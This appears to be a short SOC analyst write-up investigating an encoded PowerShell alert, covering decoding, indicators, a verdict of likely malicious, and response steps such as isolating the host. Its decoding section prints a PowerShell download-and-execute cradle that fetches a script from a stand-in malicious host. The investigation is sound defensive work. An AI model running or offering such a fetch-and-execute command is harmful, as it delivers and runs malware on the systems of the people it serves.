# SOC Alert Investigation – Suspicious PowerShell Execution

## Alert Summary
A SIEM alert detected PowerShell executing a base64-encoded command on host WIN-WS01.

Encoded PowerShell commands are frequently used by attackers to hide malicious activity.

---

## Investigation Steps

### 1. Alert Review
Alert source indicated PowerShell executed with the `-EncodedCommand` flag.

This flag allows commands to be hidden in base64 format.

---

### 2. Command Decoding
The encoded command was decoded for analysis.

Decoded command:

IEX (New-Object Net.WebClient).DownloadString("http://malicious-site.example/payload.ps1")

---

### 3. Behavioral Analysis

Observed indicators:

• Remote script download  
• Use of PowerShell execution bypass technique  
• Obfuscated command execution

These behaviors are commonly associated with malware delivery.

---

## Conclusion

The activity is **likely malicious** due to:

• Obfuscated PowerShell execution  
• Attempt to download a remote payload  
• Use of attacker techniques commonly seen in malware campaigns

---

## Recommended Response

• Isolate affected host  
• Block malicious domain  
• Reset affected user credentials  
• Perform endpoint malware scan

---

## Tools Used

- Wazuh (alert detection)
- Splunk (log review)
- PowerShell decoding techniques
- VirusTotal (optional hash/URL reputation checks)
